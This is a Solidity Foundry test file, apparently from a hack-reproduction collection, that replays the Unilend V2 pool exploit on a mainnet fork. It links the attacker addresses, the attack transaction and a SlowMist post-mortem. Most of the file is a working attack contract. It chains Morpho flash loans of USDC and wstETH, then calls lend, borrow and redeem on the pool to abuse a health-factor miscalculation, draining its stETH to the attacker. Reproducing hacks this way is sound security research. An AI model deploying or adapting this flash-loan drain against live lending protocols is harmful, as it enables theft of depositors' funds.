// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 60 stETH
// Attacker : https://etherscan.io/address/0x55f5f8058816d5376df310770ca3a2e294089c33
// Attack Contract : https://etherscan.io/address/0x3f814e5fae74cd73a70a0ea38d85971dfa6fda21
// Vulnerable Contract : https://etherscan.io/address/0x4e34dd25dbd367b1bf82e1b5527dbbe799fad0d0
// Attack Tx : https://etherscan.io/tx/0x44037ffc0993327176975e08789b71c1058318f48ddeff25890a577d6555b6ba

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x4e34dd25dbd367b1bf82e1b5527dbbe799fad0d0#code

// @Analysis
// Post-mortem : https://slowmist.medium.com/analysis-of-the-unilend-hack-90022fa35a54
// Twitter Guy : https://x.com/SlowMist_Team/status/1878651772375572573
// Hacking God : N/A
pragma solidity ^0.8.0;


address constant USDC_ADDR = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant UNILEND_CORE = 0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958;
// usdc / stETH pool
address constant UNILEND_POOL = 0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0;
address constant UNILEND_POSITION = 0xc45e4aE09c772D143677280f0a764f34F497677a;
address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
address constant ATTACKER2 = 0x6a1F503bfEc09b6A5D3eFdDDea8BA9dCeb9ec2d1;

contract Unilend is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 21608004 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = STETH;
    }

    function testExploit() public balanceLog {
        // Step 1: attacker pledged 200 USDC to the UnilendV2Pool
        // https://app.blocksec.com/explorer/tx/eth/0xdaf42127499f878b62fc5ba2103135de1c36e1646487cee309c077296814f5ff

        // Step 2: transfer the 150,237,398 USDC lendShares to the attack contract
        // https://app.blocksec.com/explorer/tx/eth/0xefa9c4383dc58e492cd1c670d2661968db28fa7557b9c8f90685e5a6cbbf41fe
        AttackContract attackContract = new AttackContract();
        vm.prank(ATTACKER2);
        IERC721(UNILEND_POSITION).safeTransferFrom(ATTACKER2, address(attackContract), 115);

        // Step 3
        // https://app.blocksec.com/explorer/tx/eth/0x44037ffc0993327176975e08789b71c1058318f48ddeff25890a577d6555b6ba
        attackContract.attack();
    }
}

contract AttackContract {
    address public attacker;
    constructor() {
        attacker = msg.sender;
    }
    function attack() public {
        setApprove();

        uint256 num = 0x73;
        bytes memory data = abi.encode(num, USDC_ADDR);
        // Step 4: borrow 60M USDC
        IMorphoBuleFlashLoan(MORPHO).flashLoan(USDC_ADDR, 60_000_000_000_000, data);
    }

    function setApprove() public {
        IERC20(USDC_ADDR).approve(MORPHO, type(uint256).max);
        IERC20(USDC_ADDR).approve(UNILEND_CORE, type(uint256).max);
        IERC20(WSTETH).approve(MORPHO, type(uint256).max);
        IERC20(STETH).approve(UNILEND_CORE, type(uint256).max);
        IERC20(STETH).approve(WSTETH, type(uint256).max);
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata data) public {
        (uint256 num, address addr) = abi.decode(data, (uint256, address));
        if (addr == USDC_ADDR) {
            // Step 5: borrow 5.7 wstETH
            setApprove();

            // Constant chosen to exploit the miscalculated health factor bug.
            // Allows the attacker to borrow just enough stETH to drain the entire pool.
            // check Post-mortem for more details
            uint256 wstAmount = 5_757_882_098_882_308_991;

            // Liquidity0 usdc, Liquidity1 stETH
            // uint256 availableLiquidity0 = IUnilendV2Pool(UNILEND_POOL).getAvailableLiquidity0();
            uint256 availableLiquidity1 = IUnilendV2Pool(UNILEND_POOL).getAvailableLiquidity1();

            uint256 num = 0x73;
            bytes memory data = abi.encode(num, WSTETH);
            wstAmount = IWstETH(WSTETH).getWstETHByStETH(availableLiquidity1);
            IMorphoBuleFlashLoan(MORPHO).flashLoan(WSTETH, wstAmount, data);
            
        } else if (addr == WSTETH) {
            // Step 6: exploit the vulnerability
            // wstETH -> stETH
            uint256 stAmount = IWstETH(WSTETH).unwrap(amount);

            IUniLendV2Core unilendCore = IUniLendV2Core(UNILEND_CORE);

            int borrowAmount = int(IERC20(STETH).balanceOf(UNILEND_POOL));

            // 60M USDC
            int usdcAmount = 60_000_000_000_000;
            unilendCore.lend(UNILEND_POOL, -usdcAmount);
            unilendCore.lend(UNILEND_POOL, int(stAmount));

            unilendCore.borrow(UNILEND_POOL, borrowAmount, 0, address(this));

            unilendCore.redeemUnderlying(UNILEND_POOL, int(stAmount), address(this));
            unilendCore.redeemUnderlying(UNILEND_POOL, -usdcAmount, address(this));

            IWstETH(WSTETH).wrap(IWstETH(WSTETH).getStETHByWstETH(amount) + 1 wei);
            uint256 stETHAmount = IERC20(STETH).balanceOf(address(this));
            IERC20(STETH).transfer(attacker, stETHAmount);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

interface IWstETH {
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function getWstETHByStETH(uint256 _stETHAmount) external view returns (uint256);
    function getStETHByWstETH(uint256 _wstETHAmount) external view returns (uint256);
}

interface IUniLendV2Core {
    function lend(address _pool, int _amount) external returns(int mintedTokens);
    function borrow(address _pool, int _amount, uint _collateral_ammount, address _recipient) external;
    function redeemUnderlying(address _pool, int _amount, address _receiver) external returns(int _token_amount);
}

interface IUnilendV2Pool {
    function userSharesOftoken0(uint _nftID) external view returns (uint _lendShare0, uint _borrowShare0);
    function userSharesOftoken1(uint _nftID) external view returns (uint _lendShare1, uint _borrowShare1);
    function userBalanceOftoken0(uint _nftID) external view returns (uint _lendBalance0, uint _borrowBalance0);
    function userBalanceOftoken1(uint _nftID) external view returns (uint _lendBalance1, uint _borrowBalance1);
    function getAvailableLiquidity0() external view returns (uint _available);
    function getAvailableLiquidity1() external view returns (uint _available);
    function getLTV() external view returns (uint);
    function getLB() external view returns (uint);
    function getRF() external view returns (uint);
}

interface IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}